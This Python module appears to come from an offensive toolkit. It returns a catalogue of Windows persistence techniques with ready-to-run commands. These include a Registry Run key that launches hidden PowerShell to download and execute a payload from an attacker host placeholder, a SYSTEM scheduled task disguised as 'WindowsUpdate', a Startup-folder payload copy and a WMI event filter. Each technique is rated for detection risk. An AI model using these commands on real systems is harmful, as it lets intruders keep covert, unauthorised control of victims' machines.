"""Windows persistence methods"""

def get_windows_persistence_methods():
    """
    Get all Windows persistence methods
    Returns: Dict of persistence methods
    """
    methods = {
        'registry_run': {
            'description': 'Add to Registry Run key',
            'commands': [
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command IEX(IWR http://ATTACKER_IP/payload.ps1 -UseBasicParsing)" /f'
            ],
            'detection_risk': 'Medium',
            'requires': 'User account access'
        },
        'scheduled_task': {
            'description': 'Create scheduled task',
            'commands': [
                'schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -WindowStyle Hidden -Command IEX(...)" /sc onlogon /ru System'
            ],
            'detection_risk': 'Medium',
            'requires': 'User or SYSTEM access'
        },
        'startup_folder': {
            'description': 'Add to Startup folder',
            'commands': [
                'copy payload.exe "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"'
            ],
            'detection_risk': 'Low',
            'requires': 'Write access to user profile'
        },
        'wmi_event': {
            'description': 'WMI Event Subscription',
            'commands': [
                '$FilterArgs = @{name=\'Updater\'; EventNameSpace="root\\CimV2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"};',
                '$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs'
            ],
            'detection_risk': 'High',
            'requires': 'Admin access'
        }
    }
    
    return methods